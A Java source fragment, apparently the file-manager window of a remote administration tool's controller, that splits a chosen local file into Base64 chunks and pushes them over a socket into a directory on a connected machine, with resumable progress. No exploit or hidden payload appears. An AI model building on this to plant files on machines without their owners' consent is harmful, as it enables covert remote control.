			            JOptionPane.QUESTION_MESSAGE) == JOptionPane.YES_OPTION){
			    	     Master.Remove_Form_FileManager_VB(sock);
			    	 	form.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
			        }else{
			        	form.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
			        	
			        }
			    }
			}); 
			
			
			
			
		   FontUIResource fontx = new FontUIResource("Verdana", Font.PLAIN, 13);
		    
		//	 form.add(btnNext);
			// form.add(Dir);
		        sp = new JScrollPane(j); 
		        j.setFont(fontx);
		        sp.setBounds(5, 100, 485, 290); 
		        form.setLayout(new BorderLayout());
		        JPanel Buttons = new JPanel();
		        Buttons.setSize(50, 50);
		        Buttons.setBackground(Color.DARK_GRAY);
		        Buttons.setLayout(null);
		        Buttons.add(btnNext); 
		        Buttons.add(Dir);
		        Buttons.add(btnNext_Refresh); 
		        Buttons.add(btnNext_get_usr);
		        Buttons.add(btnNext_get_dsk);
				   // spRight.setDividerSize(300);
				   // spRight.setContinuousLayout(true);
				    final JSplitPane split;

				    split = new JSplitPane(JSplitPane.VERTICAL_SPLIT, Buttons,sp );
				   // split.setContinuousLayout(false);
				    split.setDividerSize(10);
				    split.setDividerLocation(120);
				    split.setOneTouchExpandable(true);
				    //form.add(split, BorderLayout.CENTER);
				    form.addComponentListener(new ComponentAdapter() {
				        public void componentResized(ComponentEvent componentEvent) {
				        	split.setDividerLocation(120 );
				        	Dir.setSize(form.getWidth()-10,Dir.getHeight() );
				        	split.validate();
				        	split.repaint();
				        }
				    });
				 //form.add(sp);
			        //form.add(leftSplitPane, BorderLayout.WEST);
			       // form.add(splitPane, BorderLayout.CENTER);
				 form.validate();
				 form.setResizable(true);
				    form.getContentPane().add(split, BorderLayout.CENTER);
		        
		        
		        
		        
		        
		        
			// form.add(sp);
			 form.validate();
			// form.getContentPane().setBackground(Color.DARK_GRAY);
			 form.setVisible(true);
			
	}
	
	private void remo_row(String str1,String str2){
		 DefaultTableModel Model = (DefaultTableModel) j.getModel();
		 for(int row = 0;row < Model.getRowCount();row++) {
			  for(int col = 0;col < Model.getColumnCount();col++) {
				 
		 	    	if (Model.getValueAt(row, 1) == str1 || (Model.getValueAt(row, 1)).toString().contains(str1)){
		 	    		//  new MessageBox().infoBox(str1, str2);
		 	    		 Model.removeRow(row);
		 	    		 j.revalidate();
		 	    	}
		 	      }
		 	}
	}
	public void get_row_index(){
		 
		 DefaultTableModel dm = (DefaultTableModel) j.getModel();
		 int rowCount = dm.getRowCount();
		 //Remove rows one by one from the end of the table
		 for (int i = rowCount - 1; i >= 0; i--) {
		     dm.removeRow(i);
		 	j.repaint();
		 }
	}
	private String local_filePath =  "";
	private void do_upload(){
		

		JFileChooser jfc = new JFileChooser();

		int returnValue = jfc.showOpenDialog(null);
		// int returnValue = jfc.showSaveDialog(null);

		if (returnValue == JFileChooser.APPROVE_OPTION) {
			File selectedFile = jfc.getSelectedFile();
			 
	            local_filePath= selectedFile.getAbsolutePath();
			System.out.println(selectedFile.getAbsolutePath());
		}
		 
		  if(local_filePath.length()>1){
			  File target = new File(local_filePath);
				
				 String chunks_folder = target.getParent()+ File_Seperator + "UploadChunksFor_" + target.getName().substring(0, target.getName().lastIndexOf("."));
				 int prev_prog = Get_Progress_downloader(chunks_folder + File_Seperator);
			  
				 there_but_notsent =0;
				 if(prev_prog==0){
					  Upload_Chunk = 0;
				  }else{
					  Upload_Chunk = prev_prog;
				  }
					try {
					   
							File fx = new File(chunks_folder);
							
							if(fx.exists() == false){
								fx.mkdirs();
								Upload_Chunk = 0;
								save_Progress_downloader(chunks_folder+File_Seperator, Upload_Chunk);
								split_uns_not_thread(chunks_folder,target,false,0);
								//split_uns(folder_path,file);
								 
							}else{
								  
								Master.Send_Data("send_actual_upload" + YY + target.getName().substring(0,target.getName().lastIndexOf("."))+ YY + target.getName()  + YY +(chunks_folder+File_Seperator) + YY + Dir.getText() + File_Sep  + YY + target.getAbsolutePath() + YY,sock,false);
							  
						 
							}
						
						 
					 
					} catch (Exception e) {
						 System.out.println("" + e.getLocalizedMessage()+"\n" + chunks_folder);
					}
		  }
		   
	}
	 private int Get_Progress_downloader(String saver_dir){
		 	int parts_count = 0;
		 	saver_dir = saver_dir  + "Progress_Uploader_Chunk.txt";
		 	try{
		 		File xf = new File(saver_dir);
		 		if (xf.exists()){
		 			BufferedReader br = new BufferedReader(new FileReader(xf));
		 	 		parts_count = Integer.parseInt(br.readLine());
		 		}else{
		 			
		 			xf.createNewFile();
		 			FileWriter FW = new  FileWriter(xf);
		 			FW.write(""+parts_count);
		 			FW.close();
		 			BufferedReader br = new BufferedReader(new FileReader(xf));
		 	 		parts_count = Integer.parseInt(br.readLine());
		 		}
		 		
		 	}catch(Exception x){
		 		File xf = new File(saver_dir);
		 		if (xf.exists()){
		 			xf.delete();
		 			try {
						xf.createNewFile();
						FileWriter FW = new  FileWriter(xf);
			 			FW.write(""+parts_count);
			 			FW.close();
			 			BufferedReader br = new BufferedReader(new FileReader(xf));
			 	 		parts_count = Integer.parseInt(br.readLine());
		 				} catch (IOException e) {}
		 		
		 		}else{
		 			try {
						xf.createNewFile();
						FileWriter FW = new  FileWriter(xf);
			 			FW.write(""+parts_count);
			 			FW.close();
			 			BufferedReader br = new BufferedReader(new FileReader(xf));
			 	 		parts_count = Integer.parseInt(br.readLine());
		 				} catch (IOException e) {}
		 		}
		 	}
		 	return parts_count;
		 	
		 }
		 private  void save_Progress_downloader(String prog_saver,int parts_count){
			 prog_saver = prog_saver   + "Progress_Uploader_Chunk.txt";
			 //System.out.print(prog_saver);
			 try {
				    File xf = new File(prog_saver);
					if (xf.exists()== false){
						xf.createNewFile();
						FileWriter FW = new  FileWriter(xf);
						FW.write(""+parts_count);
						FW.close();
						BufferedReader br = new BufferedReader(new FileReader(xf));
				 		parts_count = Integer.parseInt(br.readLine());
					}else{
						FileWriter FW = new  FileWriter(xf);
						FW.write(""+parts_count);
						FW.close();
						BufferedReader br = new BufferedReader(new FileReader(xf));
				 		parts_count = Integer.parseInt(br.readLine());
					}
				 
					} catch (IOException e) {}
		 }
		 private  int called = 0;
			private  void split_uns_not_thread(final String Ch_Dir,final File file,boolean is_resume,int counter) throws Exception{
				int max_value_chunks = get_max_chunks_number_uns(Ch_Dir,file);
				//System.out.println("SZ" + max_value_chunks );
				Master.Send_Data("prepare_chunk_uploader_uns" + YY + max_value_chunks + YY  + file.getName() + YY,sock,false);
			
				if(is_resume ==false){
					//Chunks_arraylist(Ch_Dir,file,counter);
					File f=new File(file.getAbsolutePath());
			  		long len;
			  		int b =1024 ;// for transmit @ 43.56164384 KB / Sec , The less , the faster , but unstable 
			  		FileInputStream fis;
					try {
						fis = new FileInputStream(f);
						len=f.length();
					  	int i=0;//count Chunks
				  		if(Upload_Chunk >0){
				  			Upload_Chunk =0;
				  			 save_Progress_downloader(Ch_Dir+File_Seperator, Upload_Chunk);
				  			there_but_notsent = 1;
							//	System.out.println("Resume : " + Chunk_counter+"\n");
				  			}
				  	  String name_withoutDot = f.getName().substring(0, f.getName().lastIndexOf("."));
				  	  
				  		if(i<max_value_chunks){
				  				
				  				ByteArrayOutputStream bOutput = new ByteArrayOutputStream(1025);
				  				try{
				  						bOutput = new ByteArrayOutputStream(1025);
				  						for(int j=0;j<b;j++){ 
						  					 
							  			 	 
							  			 	 int ch;
				  							if((ch=fis.read())!=-1){
						  						bOutput.write(ch);
						  						}
						  						}
				  						bOutput.close();
				  						 byte[] encoded = Base64.getEncoder().encode(bOutput.toByteArray());
				  						 String Numeric = "fsfs"+i;
				  						 String CMD = "upload_ch_uns_nothread" +YY + f.getName() + YY + f.getAbsolutePath() +  YY + Dir.getText()+File_Sep+name_withoutDot +YY +Numeric + YY + new String(encoded)+ YY + (max_value_chunks) + YY;
								      
								     	Master.Send_Data(CMD, sock,false);
								     	System.out.println("i : " + i+"\n");
							  				 
				  				}catch(Exception x){ System.out.println("I Error\n" + x.getMessage());}
				  			
			  			 
				  		}else {
				  			String CMD = "finished_upload_uns" +YY + f.getName() + YY + name_withoutDot +  YY + f.getAbsolutePath() +YY + Dir.getText()+File_Sep + YY;
				  			Master.Send_Data(CMD, sock,false);
					        Upload_Chunk = 0;
					        save_Progress_downloader(Ch_Dir + File_Seperator ,Upload_Chunk);
				  		}
				  		try{fis.close();}catch(Exception x){ }
				  	
				         } catch (Exception e) {
						exit_unstable = true;
					 System.out.println("chunk_exp_upload" + YY + e.getMessage());
					}
					
				}else if(is_resume ==true){
					Upload_Chunk = counter;
					File f=new File(file.getAbsolutePath());
					FileInputStream fis= new FileInputStream(f);
					if (Upload_Chunk<max_value_chunks){
						 String name_withoutDot = f.getName().substring(0, f.getName().lastIndexOf("."));
						String Numeric = "fsfs"+Upload_Chunk;
					if(called ==1){
						called=0;
						String CMD = "finished_upload_uns" +YY + f.getName() + YY + name_withoutDot +  YY + f.getAbsolutePath() +YY + Dir.getText()+File_Sep + YY;
			  			Master.Send_Data(CMD, sock,false);
				        Upload_Chunk = 0;
				        save_Progress_downloader(Ch_Dir + File_Seperator ,Upload_Chunk);
					}else{
						 try{
							 byte[] encoded  = Base64.getEncoder().encode(Certain_Bytes(fis,Upload_Chunk,1024,f));
							 //System.out.print("\n" + "Client "+Numeric + "\n");
							 String CMD = "upload_ch_uns_nothread" +YY + f.getName() + YY + f.getAbsolutePath() +  YY + Dir.getText()+File_Sep+name_withoutDot +YY +Numeric + YY + new String(encoded)+ YY + (max_value_chunks) + YY;
							 
								Master.Send_Data(CMD, sock,false);
						 }catch(Exception x){
							 System.out.print("\n" + "EX  "+x.getMessage() + "\n");
						 }
							 
								 
					}
					
						 
							
					}else{
						try{fis.close();}catch(Exception x){ }	
						String name_withoutDot = f.getName().substring(0, f.getName().lastIndexOf("."));
						 String CMD = "finished_upload_uns" +YY + f.getName() + YY + name_withoutDot +  YY + f.getAbsolutePath() +YY +"";
						 Master.Send_Data(CMD, sock,false);
				         Upload_Chunk = 0;
					     save_Progress_downloader(Ch_Dir + File_Seperator ,Upload_Chunk);
					}
					
					
					
					return;
					 
				}
				
				
				
				
				
				
				
			}
			 private  byte[] Certain_Bytes(FileInputStream fis,int Chunk_to_Read_From,int size,File file) throws IOException{
				 
					int i;
					 
					fis.skip((Chunk_to_Read_From)*size);
					
					ByteArrayOutputStream bOutput = new ByteArrayOutputStream(size+1);
					  for(int j=0;j<size;j++){
				 		 	int    bytesRead;
							if((bytesRead=fis.read())!=-1){
								 bOutput.write(bytesRead);
								}
						 
							}
					  if(called==1){//because it repeats last Chunk twice , thus we will take only one 
						  return null;
					  }
					  System.out.println("size " + bOutput.size() + " called : " + called);
					bOutput.close();
					if ( bOutput.size()< size){
						called +=1;
					}
					return bOutput.toByteArray();
				}
			private  int get_max_chunks_number_uns(String Ch_Dir,File file){
				 
				 int chunkSize = 0  ;
				  File f=new File(file.getAbsolutePath());
			  		long len = file.length();
			  		int b = 1024;//10024 * 1  ;
			  	 
			  		 
					try {
						int c=(int)len/b;
					  	
				  		if(((int)len%b)!=0){
				  			c++;
				  		}
				  		chunkSize = c;
						  return chunkSize ;
				  		
					} catch (Exception e) {
						 Master.Send_Data("chunk_exp_upload" + YY + e.getMessage() + YY ,sock,false);
					} 
			  		
				
					return chunkSize ;
			}
	
}

